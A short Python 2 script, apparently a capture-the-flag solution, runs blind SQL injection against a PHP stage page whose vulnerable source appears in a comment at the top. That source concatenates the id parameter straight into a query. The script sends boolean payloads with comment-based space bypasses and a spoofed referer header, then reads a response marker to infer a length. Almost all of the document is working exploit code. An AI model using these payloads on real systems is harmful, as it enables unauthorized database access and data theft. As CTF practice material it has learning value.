'''
<!--
	mysql_select_db("inject_xiaoshiniudao9", $con);
	$sql="select title from article where id='".$_GET['id']."'";
	$result=mysql_query($sql,$con);
	echo $result;
	mysql_close($con);
-->
'''
import requests

list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

url = "http://132.228.23.162/stage/5/6C9428036D386316.php?id=1"
headers = {'referer': 'http://www.10086.cn'}
length = 0

for i in xrange(10):
    payload = "\'/**/and/**/length('aaaa')=%s%%23" % i
    pay_url = url + payload
    print
    r = requests.get(pay_url, headers={'referer': 'http://www.10086.cn'})
    # print pay_url
    print r.text
    if 'Resource id #3' in r.text:
        length = i
        print "length is %s" % length
        break
